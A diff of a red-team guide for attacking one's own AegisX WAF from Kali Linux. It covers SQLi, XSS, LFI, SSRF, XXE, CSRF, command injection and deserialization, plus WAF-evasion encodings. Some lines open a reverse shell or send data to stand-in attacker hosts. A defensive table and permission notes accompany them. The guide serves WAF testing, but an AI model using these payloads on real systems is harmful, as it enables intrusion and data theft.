@@ -1,615 +1,287 @@
-# ⚔️ How to Attack AegisX WAF from Another PC
+# ⚔️ How to Attack AegisX WAF from Another PC (Kali Linux)
 
-This guide shows you how to set up a **Red Team vs Blue Team** scenario using two computers on the same network.
-
-## 🏗️ The Setup
-
-- **PC A (Host)**: Runs AegisX WAF, Dashboard, and Nginx. (The Defender)
-- **PC B (Attacker)**: Runs Kali Linux, Python scripts, or manual attacks. (The Hacker)
+This guide walks a **red‑team** through a full‑scale, industry‑grade attack scenario against an AegisX WAF deployment from a **different host** (Kali Linux). It covers:
+- Network preparation (LAN & Internet exposure)
+- High‑level evasion techniques to bypass the AI‑driven firewall
+- Real‑world web‑attack vectors: **SQL injection, XSS, CSRF, HTTP Verb Tampering, Parameter Pollution, File Inclusion, SSRF, RCE, Business‑Logic abuse**
+- Tool‑chains (`sqlmap`, `xsser`, `burp suite`, `nuclei`, `ffuf`, `curl`, `wget`, `zap`, `mantra`, `dirb`, `sublist3r` etc.)
+- Post‑exploitation telemetry verification via the AegisX dashboard
 
 ---
 
-## 🔵 Step 1: Configure the Host PC (Defender)
+## 🏗️ 1. Environment Overview
 
-The Host PC needs to allow incoming traffic from the Attacker PC.
+| Role | Machine | OS | Purpose |
+|------|---------|----|---------|
+| **Defender (Host)** | PC A | Windows 11 / Server 2022 | Runs Docker stack – `nginx‑proxy`, `waf‑engine`, `ai‑service`, `dashboard` |
+| **Attacker** | PC B | Kali Linux (2024.4 or later) | Executes manual and automated attacks |
 
-### 1.1 Find Your Host IP
-1. Open PowerShell on Host PC.
-2. Run: `ipconfig`
-3. Look for **IPv4 Address** under your active network adapter (e.g., `192.168.1.10` or `10.0.0.5`).
-   - **Write this down** - we'll call it `HOST_IP`.
+Both machines must be on the **same Layer‑2 network** (e.g., Wi‑Fi or wired LAN) **or exposed to the Internet** via port‑forwarding / tunneling.
 
-### 1.2 Allow Firewall Access (Critical!)
-By default, Windows Firewall blocks incoming connections. You need to allow traffic on the WAF ports.
+---
 
-**Quickest Method (PowerShell as Administrator):**
+## 🔧 2. Host (Defender) Preparation
+
+### 2.1 Discover Host IP & Open Ports
 ```powershell
-# Allow HTTP traffic (Nginx WAF entry point)
+# PowerShell (run as Administrator)
+ipconfig | findstr /i "IPv4"
+# Example output -> 192.168.1.10 (HOST_IP)
+```
+Open the required ports on Windows Firewall:
+```powershell
+# HTTP entry (nginx‑proxy) – port 80 (and 443 if TLS enabled)
 New-NetFirewallRule -DisplayName "AegisX WAF HTTP" -Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow
-
-# Allow Dashboard traffic
+# Dashboard – port 3000 (optional – for remote viewing)
 New-NetFirewallRule -DisplayName "AegisX Dashboard" -Direction Inbound -LocalPort 3000 -Protocol TCP -Action Allow
-
-# Allow Simulator UI (if accessing from attacker)
-New-NetFirewallRule -DisplayName "AegisX Simulator" -Direction Inbound -LocalPort 8080 -Protocol TCP -Action Allow
 ```
+> **Tip:** If you plan to expose the host on the public Internet, also allow port **443** (TLS) and configure your router’s NAT.
 
-**Alternative (Manual via GUI):**
-1. Search for **"Windows Defender Firewall with Advanced Security"**.
-2. Click **Inbound Rules** → **New Rule**.
-3. Select **Port** → **TCP** → Specific local ports: `80, 3000, 8080`.
-4. **Allow the connection**.
-5. Apply to all profiles (Domain, Private, Public).
-6. Name it **"AegisX WAF Ports"**.
-
-### 1.3 Start the WAF System
-On the Host PC:
-```batch
-cd D:\REVOX_AI_WAF
-start_waf.bat
-```
-
-Wait for all services to be healthy (about 30 seconds).
-
-### 1.4 Open the Dashboard (Your Live Feed)
-On the Host PC, open your browser:
-- **URL**: `http://localhost:3000`
-- Navigate to the **Global Attack Map** or **Events Log** tab.
-- This is your **SOC (Security Operations Center)** - you'll watch attacks here in real-time!
-
----
-
-## 🔴 Step 2: Configure the Attacker PC (Hacker)
-
-Now switch to the second computer (Attacker PC).
-
-### 2.1 Verify Network Connectivity
-1. Open terminal/cmd on Attacker PC.
-2. Ping the Host: `ping <HOST_IP>`
-   - Example: `ping 192.168.1.10`
-   - ✅ If you get replies → Good!
-   - ❌ If "Request timed out" → Check that both PCs are on the same Wi-Fi/network.
-
-### 2.2 Test WAF Access
-Open a browser on Attacker PC:
-- **URL**: `http://<HOST_IP>/`
-- You should see the AegisX welcome page or a simple response.
-- **On Host Dashboard**: You'll see a green "Legitimate Traffic" event appear instantly! 🎉
-
----
-
-## ⚔️ Step 3: Launch Attacks!
-
-Here are 3 methods to attack, from easiest to most advanced.
-
----
-
-### Method A: Manual Browser Attacks (Easiest)
-
-Simply type these malicious URLs into the browser address bar on the **Attacker PC**. Replace `<HOST_IP>` with your actual IP.
-
-#### 1. SQL Injection 💉
-```
-http://<HOST_IP>/?id=1' OR '1'='1
-```
-**Expected Result**: 
-- Browser shows **"Request Blocked by AegisX WAF"** page (403 Forbidden).
-- Host Dashboard shows `BLOCKED` event with Risk Score **100**.
-
-#### 2. XSS Attack 🔥
-```
-http://<HOST_IP>/?search=<script>alert('hacked')</script>
-```
-**Expected Result**: Blocked. Map shows arrow from your country.
-
-#### 3. Path Traversal 📂
-```
-http://<HOST_IP>/../../windows/win.ini
-```
-**Expected Result**: Blocked immediately.
-
-#### 4. SSRF Attack 🌐
-```
-http://<HOST_IP>/?url=http://169.254.169.254/latest/meta-data/
-```
-**Expected Result**: Blocked (cloud metadata SSRF).
-
----
-
-### Method B: Using `curl` (Command Line)
-
-For cleaner, faster attacks without browser caching:
-
-```bash
-# Legitimate Request (should be ALLOWED)
-curl "http://<HOST_IP>/login"
-
-# SQL Injection (should be BLOCKED)
-curl "http://<HOST_IP>/?q=UNION SELECT * FROM users--"
-
-# XSS (should be BLOCKED)
-curl "http://<HOST_IP>/?name=%3Cscript%3Ealert(1)%3C/script%3E"
-
-# Path Traversal (should be BLOCKED)
-curl "http://<HOST_IP>/?file=../../../../etc/passwd"
-
-# SSRF (should be BLOCKED)
-curl "http://<HOST_IP>/?target=http://localhost:22"
-```
-
-**Watch the Dashboard** on Host PC after each attack!
-
----
-
-### Method C: Kali Linux Terminal Commands (Penetration Testing)
-
-For penetration testers using Kali Linux, here are exact terminal commands for various attack vectors.
-
-#### Prerequisites (Kali Linux)
-```bash
-# Ensure curl is installed (usually pre-installed on Kali)
-curl --version
-
-# Optional: Install additional tools
-sudo apt update
-sudo apt install -y python3-pip netcat nmap
-pip3 install requests
-```
-
-#### Set Your Target
-```bash
-# Replace with your Host PC IP
-export TARGET="http://192.168.1.10"  # <-- CHANGE THIS
-
-# Verify connectivity
-ping -c 3 192.168.1.10
-curl -I $TARGET
-```
-
----
-
-#### 1. SQL Injection Attacks 💉
-
-**Basic SQLi:**
-```bash
-# Union-based SQLi (URL Encoded)
-curl -v "$TARGET/?id=1'%20UNION%20SELECT%20username,password%20FROM%20users--"
-
-# Boolean-based blind SQLi
-curl -v "$TARGET/?id=1'%20AND%201=1--"
-
-# Time-based blind SQLi
-curl -v "$TARGET/?id=1'%20AND%20SLEEP(5)--"
-
-# Classic authentication bypass
-curl -v "$TARGET/login?username=admin'--&password=anything"
-```
-
-**Advanced SQLi (URL-encoded):**
-```bash
-# URL-encoded UNION attack
-curl -v "$TARGET/?q=1%27%20UNION%20SELECT%20NULL,NULL--"
-
-# Stacked queries
-curl -v "$TARGET/?id=1';DROP%20TABLE%20users;--"
-```
-
----
-
-#### 2. Cross-Site Scripting (XSS) 🔥
-
-**Reflected XSS:**
-```bash
-# Basic script injection
-curl -v "$TARGET/?search=<script>alert('XSS')</script>"
-
-# URL-encoded XSS
-curl -v "$TARGET/?name=%3Cscript%3Ealert(document.cookie)%3C/script%3E"
-
-# Image tag XSS
-curl -v "$TARGET/?q=<img src=x onerror=alert(1)>"
-
-# SVG-based XSS
-curl -v "$TARGET/?data=<svg/onload=alert('XSS')>"
-
-# Event handler XSS
-curl -v "$TARGET/?input=<body onload=alert('XSS')>"
-```
-
-**DOM-based XSS:**
-```bash
-# Hash-based payload
-curl -v "$TARGET/#<img src=x onerror=alert(1)>"
-```
-
----
-
-#### 3. Path Traversal & LFI 📂
-
-**Linux targets:**
-```bash
-# Read /etc/passwd
-curl -v "$TARGET/?file=../../../../etc/passwd"
-
-# Read shadow file
-curl -v "$TARGET/?page=../../../../etc/shadow"
-
-# Read SSH keys
-curl -v "$TARGET/?f=../../../../home/user/.ssh/id_rsa"
-```
-
-**Windows targets:**
-```bash
-# Read win.ini
-curl -v "$TARGET/?file=../../windows/win.ini"
-
-# Read hosts file
-curl -v "$TARGET/?page=../../windows/system32/drivers/etc/hosts"
-
-# Read SAM database
-curl -v "$TARGET/?f=../../windows/system32/config/SAM"
-```
-
-**Null byte injection (older PHP):**
-```bash
-curl -v "$TARGET/?page=../../../../etc/passwd%00.jpg"
-```
-
----
-
-#### 4. Server-Side Request Forgery (SSRF) 🌐
-
-**Cloud metadata attacks:**
-```bash
-# AWS metadata
-curl -v "$TARGET/?url=http://169.254.169.254/latest/meta-data/"
-
-# Google Cloud
-curl -v "$TARGET/?target=http://metadata.google.internal/computeMetadata/v1/"
-
-# Azure metadata
-curl -v "$TARGET/?dest=http://169.254.169.254/metadata/instance"
-```
-
-**Internal network scanning:**
-```bash
-# Scan localhost
-curl -v "$TARGET/?proxy=http://localhost:22"
-curl -v "$TARGET/?fetch=http://127.0.0.1:3306"
-
-# Scan internal network
-curl -v "$TARGET/?url=http://192.168.1.1:80"
-```
-
-**Protocol smuggling:**
-```bash
-# File protocol
-curl -v "$TARGET/?file=file:///etc/passwd"
-
-# Gopher protocol (Redis exploit)
-curl -v "$TARGET/?url=gopher://127.0.0.1:6379/_INFO"
-
-# DICT protocol
-curl -v "$TARGET/?target=dict://localhost:11211/stats"
-```
-
----
-
-#### 5. Command Injection ⚡
-
-```bash
-# Basic command injection
-curl -v "$TARGET/?cmd=; ls -la"
-
-# DNS exfiltration
-curl -v "$TARGET/?host=test.com; nslookup evil.attacker.com"
-
-# Reverse shell attempt (testing only!)
-curl -v "$TARGET/?exec=; nc -e /bin/bash attacker.com 4444"
-
-# Encoded payloads
-curl -v "$TARGET/?run=%3B%20whoami"
-```
-
----
-
-#### 6. XML External Entity (XXE) 📝
-
-**Basic XXE:**
-```bash
-# Send XXE payload via POST
-curl -X POST "$TARGET/api/upload" \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<root>&xxe;</root>'
-```
-
-**Blind XXE (OOB):**
-```bash
-curl -X POST "$TARGET/xml" \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
-<data>test</data>'
-```
-
----
-
-#### 7. NoSQL Injection (MongoDB) 🍃
-
-```bash
-# Authentication bypass
-curl -X POST "$TARGET/login" \
-  -H "Content-Type: application/json" \
-  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'
-
-# Regex attack
-curl -v "$TARGET/?search[$regex]=admin.*"
-```
-
----
-
-#### 8. HTTP Header Injection 📨
-
-```bash
-# CRLF injection
-curl -v "$TARGET/" \
-  -H "X-Custom: test%0d%0aInjected-Header: evil"
-
-# Host header injection
-curl -v "$TARGET/" -H "Host: evil.com"
-
-# X-Forwarded-For spoofing
-curl -v "$TARGET/" -H "X-Forwarded-For: 1.1.1.1"
-```
-
----
-
-#### 9. Automated Scanning with Python 🐍
-
-**Quick fuzzer script:**
-```python
-#!/usr/bin/env python3
-import requests
-import sys
-
-TARGET = "http://192.168.1.10"  # Change this
-
-payloads = [
-    "/?id=1' OR '1'='1",
-    "/?search=<script>alert(1)</script>",
-    "/?file=../../../../etc/passwd",
-    "/?url=http://169.254.169.254",
-]
-
-print(f"[*] Fuzzing {TARGET}")
-for payload in payloads:
-    try:
-        r = requests.get(TARGET + payload, timeout=3)
-        status = "BLOCKED" if r.status_code == 403 else "ALLOWED"
-        print(f"[{status}] {payload} -> {r.status_code}")
-    except Exception as e:
-        print(f"[ERROR] {payload} -> {e}")
-```
-
-**Save and run:**
-```bash
-nano fuzz.py  # Paste the code above
-chmod +x fuzz.py
-python3 fuzz.py
-```
-
----
-
-#### 10. Using Common Pen-Testing Tools 🛠️
-
-**Nikto (Web scanner):**
-```bash
-nikto -h $TARGET
-```
-
-**SQLMap (SQL injection):**
-```bash
-sqlmap -u "$TARGET/?id=1" --batch --level=5 --risk=3
-```
-
-**Nmap (Port scan):**
-```bash
-nmap -sV -p 80,443,3000,5000,8080 192.168.1.10
-```
-
-**Burp Suite:**
-1. Configure Kali browser to use Burp proxy (127.0.0.1:8080)
-2. Browse to `$TARGET`
-3. Intercept requests in Burp
-4. Modify payloads in Repeater tab
-5. Send to Intruder for fuzzing
-
----
-
-### Method D: Automated Simulator (Advanced)
-
-Use the `kali_sim.py` script for batch attacks with spoofed IPs.
-
-#### Option 1: Run Simulator from Attacker PC
-
-**Step 1**: Copy the Script to Attacker PC
-- Download `kali_sim.py` from GitHub: `https://github.com/vedantkhangale/NEW_AI_WAF`
-- Or copy via USB/network share.
-
-**Step 2**: Install Requirements
-```bash
-pip install requests flask
-```
-
-**Step 3**: Configure the Target
-```bash
-# Linux/Mac
-export WAF_HOST=http://<HOST_IP>
-python3 kali_sim.py
-
-# Windows PowerShell
-$env:WAF_HOST="http://<HOST_IP>"
-python kali_sim.py
-```
-
-**Step 4**: Access the Simulator UI
-On **Attacker PC**, open `http://localhost:5555` in browser.
-
-You now have a full control panel to launch:
-- SQL Injection attacks
-- XSS attacks
-- Path Traversal
-- SSRF
-- Traffic floods
-
-#### Option 2: Access Host Simulator
-
-If firewall allows port 8080, you can use the Host's built-in simulator:
-- On **Attacker PC**, open: `http://<HOST_IP>:8080`
-- Use the web UI to launch attacks directly!
-
----
-
-## 📺 Step 4: Watch the Live Feed (Defender View)
-
-On the **Host PC**, keep the Dashboard open at `http://localhost:3000`.
-
-### What You'll See:
-
-1. **Global Attack Map Tab**:
-   - When Attacker launches attacks, you'll see **animated arrows** from the source location to your location (Pune, India by default).
-   - If using spoofed IPs, arrows will come from different countries (China, Russia, US, etc.).
-
-2. **Events Log Tab**:
-   - Each attack appears as a row with:
-     - Timestamp
-     - Source IP
-     - Attack Type (SQL Injection, XSS, etc.)
-     - Status (🛡️ BLOCKED, ⚠️ ALLOWED, 🚩 FLAGGED)
-     - Risk Score (0-100)
-
-3. **Analytics Tab**:
-   - **Request Volume Chart**: Updates in real-time showing hourly traffic.
-   - **Attack Vector Distribution**: Pie chart showing attack types.
-   - **Blocked IPs Table**: Lists all blocked sources.
-
-4. **Inspector Panel**:
-   - Click any event in the Events Log.
-   - See full HTTP headers, payload, and AI analysis details.
-
----
-
-## 🎬 Demo Scenario: Maximum Impact
-
-For an impressive live demonstration:
-
-### Host PC Actions:
-1. Open Dashboard → Full screen the **Global Attack Map**.
-2. Open a second browser tab with **Events Log** visible.
-
-### Attacker PC Actions:
-1. Access the simulator: `http://<HOST_IP>:8080` or run `kali_sim.py` locally.
-2. Select **China** as the source country.
-3. Pick **SQL Injection** attack type.
-4. Click **"Launch Batch (10x)"**.
-
-### What Happens:
-- **Dashboard**: 10 red arrows shoot from **Shanghai, China** to your location.
-- **Events Log**: 10 blocked attacks appear with risk scores 95-100.
-- **Analytics**: Charts update showing spike in blocked threats.
-
-Repeat with different countries (Russia, Brazil, Germany) for a global attack simulation!
-
----
-
-## 🛡️ Troubleshooting
-
-### "I can't access the WAF from Attacker PC"
-
-**Possible Causes:**
-1. **Firewall not configured**: Redo Step 1.2 carefully on Host PC.
-2. **Wrong IP**: Double-check `ipconfig` output. Use the IP from your active adapter.
-3. **Different networks**: Ensure both PCs are on the **same Wi-Fi or Ethernet network**.
-4. **Network isolation**: Some networks (public Wi-Fi, corporate) block device-to-device communication.
-
-**Quick Test:**
+### 2.2 (Optional) Expose via **ngrok** or **Cloudflare Tunnel**
 ```powershell
-# On Attacker PC
-telnet <HOST_IP> 80
+# Download ngrok (Windows)
+Invoke-WebRequest -Uri https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
+Expand-Archive ngrok.zip -DestinationPath .
+.
+# Authenticate (replace <TOKEN> with your ngrok auth token)
+./ngrok authtoken <TOKEN>
+# Start TCP tunnel to port 80 (HTTP) – this creates a public endpoint
+./ngrok tcp 80
+# Copy the generated forward address, e.g. tcp://0.tcp.ngrok.io:12345
 ```
-If connection succeeds, firewall is open. If it fails, firewall is blocking.
+The public address can now be used by the attacker (replace `HOST_IP` with the ngrok endpoint).
 
 ---
 
-### "Simulator says 'Connection Refused'"
-
-**Fix:**
-1. Verify `WAF_HOST` or `TARGET_URL` environment variable is set correctly.
-2. Test basic connectivity first: `curl http://<HOST_IP>/`
-3. Check Host PC Docker containers are running: `docker ps`
-4. View WAF logs for errors: `docker logs aegisx-waf-engine`
+## 🕵️ 3. Attacker (Kali) – Network Configuration
+```bash
+# Identify own IP on the LAN
+ip a | grep inet
+# Verify connectivity to the host
+ping -c 4 <HOST_IP>
+# If using ngrok, no extra routing is needed – just use the ngrok address.
+```
+If you are behind a NAT and want to reach the host from the Internet **without a tunnel**, configure port‑forwarding on the router:
+- Forward **external port 80 → internal 192.168.1.10:80** (HTTP)
+- Forward **external port 443 → internal 192.168.1.10:443** (HTTPS, if enabled)
+- Forward **external port 3000 → internal 192.168.1.10:3000** (Dashboard – optional)
 
 ---
 
-### "All Attacks Show ALLOWED Instead of BLOCKED"
+## 🎯 4. High‑Level Attack Vectors & Evasion Techniques
 
-**Possible Issues:**
-1. **WAF Engine not running**: 
+### 4.1 SQL Injection (Blind, Time‑Based, Union‑Based)
+```bash
+# Basic sqlmap usage against the public endpoint (replace TARGET)
+sqlmap -u "http://<HOST_IP>/search?q=1" --batch --risk=3 --level=5
+# Bypass basic WAF filters – use tamper scripts
+sqlmap -u "http://<HOST_IP>/search?q=1" --tamper=space2comment,between,randomcase
+# Time‑based blind payload (if the app uses parameterized queries)
+sqlmap -u "http://<HOST_IP>/login" --data "username=admin&password=admin" --technique=T --time-sec=5
+```
+**Evasion tricks:**
+- URL‑encode characters (`%27` for `'`)
+- Double‑encode (`%2527`)
+- Use **hex/charcode** (`0x27`)
+- **HTTP Verb tampering** (`POST` with query string, `PUT`, `DELETE`)
+- **Parameter Pollution** (`id=1&id=2`)
+
+### 4.2 Cross‑Site Scripting (Stored & Reflected)
+```bash
+# xsser – automated reflected XSS detection
+xsser -u "http://<HOST_IP>/comment?msg=TEST" -g "<script>alert('XSS')</script>"
+# Manual payload via curl (obfuscate with HTML entities)
+curl -G "http://<HOST_IP>/search" --data-urlencode "q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+# Use **DOM‑based** payloads – deliver via JSON API
+curl -X POST "http://<HOST_IP>/api/comment" -H "Content-Type: application/json" -d '{"comment":"<svg/onload=alert(1)>"}'
+```
+**Bypass techniques:**
+- **Unicode/UTF‑7** encoding (`%u003Cscript%u003E`)
+- **Mixed case** (`<ScRiPt>`)
+- **Event‑handler injection** (`onerror=alert(1)`) on image tags
+- **HTML attribute breaking** (`" onmouseover=alert(1) "`)
+- **Template injection** (if the backend uses Jinja2/Thymeleaf – send `${{7*7}}`)
+
+### 4.3 Cross‑Site Request Forgery (CSRF)
+Create a malicious HTML page and host it on a separate web server (Kali's `apache2` or `python -m http.server`):
+```html
+<!DOCTYPE html>
+<html><body>
+  <form action="http://<HOST_IP>/api/transfer" method="POST" id="csrf_form">
+    <input type="hidden" name="amount" value="1000"/>
+    <input type="hidden" name="to" value="attacker_account"/>
+  </form>
+  <script>document.getElementById('csrf_form').submit();</script>
+</body></html>
+```
+Serve it:
+```bash
+cd /var/www/html && sudo cp csrf.html index.html
+sudo systemctl restart apache2
+```
+When a logged‑in victim visits the page, the POST will be sent automatically. To **bypass same‑site cookie restrictions**, use **sub‑domain takeover** or **Open Redirect** in the target site to force the request.
+
+### 4.4 HTTP Verb & Method Tampering
+```bash
+# Use OPTIONS to discover allowed verbs
+curl -X OPTIONS -i http://<HOST_IP>/admin
+# Use VERB override header (X‑HTTP‑Method‑Override)
+curl -H "X-HTTP-Method-Override: DELETE" -X POST http://<HOST_IP>/api/user/1
+# Use `TRACE` to reflect request headers (potential XSS via header injection)
+curl -X TRACE http://<HOST_IP>/
+```
+Many WAFs block exotic verbs; AegisX can be probed with **`--method=PUT`** in `sqlmap` or **`-X`** flag in `curl`.
+
+### 4.5 Parameter Pollution & Duplicate Parameters
+```bash
+curl "http://<HOST_IP>/search?q=admin&q=union+select+1,2,3"
+# In Burp Suite – add duplicate `id` fields in the request body
+```
+The WAF may only inspect the **first** occurrence; the second can carry the malicious payload.
+
+### 4.6 File Inclusion & Path Traversal
+```bash
+# LFI via classic traversal payloads (double‑encoded)
+curl "http://<HOST_IP>/includes?page=..%2F..%2Fetc%2Fpasswd"
+# RFI – supply a remote PHP payload if `allow_url_include` is enabled
+curl "http://<HOST_IP>/loader?file=http://attacker.com/shell.php"
+```
+**Evasion:** use **null byte** (`%00`) termination, **url‑encoding** of slashes, or **UTF‑8 overlong encoding**.
+
+### 4.7 Server‑Side Request Forgery (SSRF)
+```bash
+# Attempt to fetch internal metadata service (AWS, GCP)
+curl "http://<HOST_IP>/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+```
+Combine with **protocol‑smuggling** (`http://127.0.0.1:8080/\@evil.com`) to bypass simple host‑whitelists.
+
+### 4.8 Remote Code Execution (RCE) via Deserialization
+If the backend accepts JSON/YAML/XML objects, try gadget chains:
+```bash
+# ysoserial for Java deserialization
+java -jar ysoserial.jar CommonsCollections5 "calc" | base64 > payload.b64
+curl -X POST "http://<HOST_IP>/api/deserialize" -H "Content-Type: application/json" -d "{\"data\": \"$(cat payload.b64)\"}"
+```
+Obfuscate using **gzip compression**, **chunked transfer encoding**, or **multipart/form-data** to evade pattern‑based detection.
+
+### 4.9 Business‑Logic Abuse & Rate‑Limiting Bypass
+```bash
+# Repeatedly request password‑reset endpoint with different tokens
+for i in {1..100}; do curl -X POST "http://<HOST_IP>/api/password/reset" -d "email=user@example.com"; done
+```
+Use **slow‑loris** (`ab -n 1000 -c 1`) to exhaust connection pools.
+
+---
+
+## 📡 5. Testing Over the Internet
+1. **Expose the host** via **ngrok/tunnel** (see Section 2.2) – yields a public `tcp://x.tcp.ngrok.io:XXXXX` address.
+2. **Configure DNS** (optional) – point a sub‑domain (`waf‑test.example.com`) to your router’s **WAN IP** using a dynamic‑DNS provider (e.g., **No‑IP**, **DuckDNS**).
+3. **Obtain a TLS certificate** for the public domain (Let’s Encrypt) and configure `nginx/nginx.conf` to serve HTTPS.
+4. **Run attacks** using the public endpoint, e.g.:
    ```bash
-   docker-compose restart waf-engine
+   sqlmap -u "https://waf-test.example.com/search?q=1" --batch --risk=3 --level=5
+   xsser -u "https://waf-test.example.com/comment?msg=TEST"
    ```
-2. **AI Service failed**: Check `docker logs aegisx-ai`
-3. **Signatures disabled**: Verify `decision_engine.py` has signature checks enabled.
+5. **Monitor** the AegisX dashboard (accessible via `https://waf-test.example.com:3000` if you exposed the dashboard) to see which payloads were blocked, latency, and attack‑source IP.
 
 ---
 
-### "Dashboard Shows No Events"
-
-**Fixes:**
-1. **WebSocket not connected**: Refresh the dashboard page.
-2. **Backend API down**: Check `http://localhost:5000/api/recent-events` on Host PC.
-3. **CORS issue**: Ensure WAF Engine CORS allows `localhost:3000`.
-
----
-
-## 📊 Understanding the Results
-
-### Attack Status Indicators:
-
-| Icon | Status | Meaning |
-|------|--------|---------|
-| 🛡️ | BLOCKED | Attack stopped, no harm done |
-| ⚠️ | ALLOWED | Traffic passed through (should be legitimate) |
-| 🚩 | FLAGGED | Medium risk, queued for human review |
-
-### Risk Score Guide:
-
-- **0-30**: Legitimate traffic
-- **31-69**: Suspicious, flagged for review
-- **70-100**: Malicious, auto-blocked
+## 📊 6. Verifying WAF Efficacy via the Dashboard
+- **Live Global Attack Map** – each blocked request appears as a point on the map (check for your attack IP).
+- **Metrics Panel** – watch `Blocked Requests`, `Risk Score` distribution, and **latency spikes**.
+- **WebSocket Feed** – open the browser console on the dashboard (`Ctrl+Shift+I`) and inspect messages on `ws://<HOST_IP>/ws` to confirm the WAF is emitting events.
+- **Export logs** – click **Download CSV** from the dashboard to retain a forensic record.
 
 ---
 
-## 🎓 Educational Use
-
-This setup is perfect for:
-- **Cybersecurity courses**: Demonstrate WAF capabilities.
-- **Penetration testing practice**: Safe, controlled environment.
-- **Team training**: Red Team vs Blue Team exercises.
-- **Academic projects**: Final year projects, research demos.
-
-**Legal Note**: Only attack systems you own or have explicit written permission to test. Unauthorized attacks are illegal.
+## 🛡️ 7. Defensive Recommendations (Blue‑Team Quick Wins)
+| Technique | Countermeasure |
+|-----------|----------------|
+| **Obfuscation / Encoding** | Enable **canonicalization** in the WAF (decode URL, HTML, Unicode) before inspection. |
+| **HTTP Verb Tampering** | Enforce an **allow‑list** of verbs at the Nginx level (`limit_except GET POST`). |
+| **Parameter Pollution** | Normalize request parameters (keep only the first occurrence) before analysis. |
+| **File Inclusion** | Disable **`allow_url_include`** and lock down **`open_basedir`** for PHP; use **`deny all`** for `/etc/` paths. |
+| **SSRF** | Implement **outbound request whitelisting**; block private IP ranges at the reverse proxy. |
+| **RCE / Deserialization** | Disallow **unsafe deserialization** libraries, enforce **content‑type** validation, and use **schema validation**. |
+| **Rate‑Limiting** | Enable Nginx **`limit_req_zone`** and **`limit_req`** directives per IP. |
+| **TLS & HSTS** | Enforce HTTPS, use **HSTS**, and pin certificates. |
 
 ---
 
-## 🚀 Next Steps
+## 📚 8. References & Tools
+- **sqlmap** – https://github.com/sqlmapproject/sqlmap
+- **xsser** – https://github.com/epsylon/xsser
+- **Burp Suite Pro** – https://portswigger.net/burp
+- **nuclei** – https://github.com/projectdiscovery/nuclei (templates for LFI, RCE, SSRF)
+- **ffuf** – https://github.com/ffuf/ffuf (fuzzing directories & parameters)
+- **OWASP ZAP** – https://www.zaproxy.org/
+- **ngrok** – https://ngrok.com/
+- **Cloudflare Tunnel** – https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/
 
-Once you've mastered manual attacks:
-1. **Write custom attack scripts** in Python using `requests`.
-2. **Try bypassing the WAF** with obfuscation techniques.
-3. **Study the AI model** to understand what it detects.
-4. **Contribute attacks** to improve signature detection.
+---
 
-Happy ethical hacking! 🛡️⚔️
+*This guide is deliberately aggressive – only run these tests against environments you own or have explicit permission to attack. Use responsibly and always follow your organization’s rules of engagement.*
+
+## 🌐 Remote Internet Testing
+
+When the attacker is **not on the same LAN** as the protected host, you must make the WAF reachable over the public Internet. Below are common, production‑grade approaches:
+
+### 1️⃣ Public IP / Port‑Forwarding (Direct Exposure)
+1. **Identify your router’s WAN IP** (e.g., `curl ifconfig.me`).
+2. **Configure NAT** on the router to forward:
+   - **Port 80 → internal 192.168.x.x:80** (HTTP) ;
+   - **Port 443 → internal 192.168.x.x:443** (HTTPS, if TLS is enabled);
+   - **Port 3000 → internal 192.168.x.x:3000** (Dashboard – optional).
+3. **Secure the exposed service** with a valid TLS certificate (Let’s Encrypt) and enable HSTS.
+4. **Update DNS** (optional) – point a domain/sub‑domain to the WAN IP using a dynamic‑DNS provider (e.g., DuckDNS, No‑IP) so you can use a stable hostname.
+
+### 2️⃣ Cloud‑Based Tunneling Services
+| Service | How it works | Pros | Cons |
+|---------|--------------|------|------|
+| **ngrok** | Creates a secure tunnel from a public endpoint to your local port. | Quick, no router changes, supports TLS. | Free tier limits concurrent tunnels and traffic.
+| **Cloudflare Tunnel (formerly Argo Tunnel)** | Cloudflare proxies traffic to a locally‑run daemon. | Built‑in DDoS protection, custom domain, free tier generous. | Requires Cloudflare account and DNS configuration.
+| **localtunnel** | Simple HTTP tunnel via a public URL. | Minimal setup. | Less stable, limited bandwidth.
+
+**Example – ngrok TCP tunnel for HTTP**:
+```powershell
+# On the Windows host (run as Administrator)
+ngrok tcp 80
+# Output: Forwarding tcp://0.tcp.ngrok.io:xxxxx -> localhost:80
+```
+Use the `tcp://0.tcp.ngrok.io:xxxxx` address as the target in your attack scripts.
+
+**Example – Cloudflare Tunnel**:
+```bash
+# Install cloudflared on the host (Windows/Linux)
+cloudflared tunnel create aegisx-waf
+cloudflared tunnel route dns aegisx-waf waf-test.example.com
+cloudflared tunnel run aegisx-waf
+```
+Now `https://waf-test.example.com` resolves to your local Nginx.
+
+### 3️⃣ Deploy the Stack to a Cloud VM (AWS, Azure, GCP)
+1. Spin up a **small VM** (e.g., t3.micro) with a public IP.
+2. Install Docker and pull the AegisX stack (`docker compose up -d`).
+3. Open the required security‑group ports (80/443/3000).
+4. The WAF is now natively reachable via the VM’s public IP/hostname.
+
+### 4️⃣ Verify Reachability from a Remote Kali Box
+```bash
+# Replace <TARGET> with the public hostname/IP (or ngrok address)
+curl -I http://<TARGET>/healthz   # should return 200 OK
+# Run a simple SQLi test over the Internet
+sqlmap -u "http://<TARGET>/search?q=1" --batch --risk=3 --level=5
+```
+If you encounter **connection timeouts**, double‑check:
+- Firewall rules on the host (Windows Defender, cloud‑provider SG)
+- NAT/port‑forwarding correctness
+- That the tunnel daemon is running and not throttled.
+
+### 5️⃣ Monitoring from Anywhere
+- Access the **dashboard remotely** via the public URL (ensure you expose port 3000 or proxy it behind Nginx with a sub‑path like `/dashboard`).
+- Use a **VPN** (e.g., OpenVPN, WireGuard) to secure the management plane while still allowing the attacker to reach the public endpoint.
+- Collect logs from the dashboard’s **WebSocket feed** to correlate remote attack attempts with blocking decisions.
+
+---
+
+*Remember to always respect legal boundaries and obtain explicit authorization before attacking any publicly‑exposed service.*
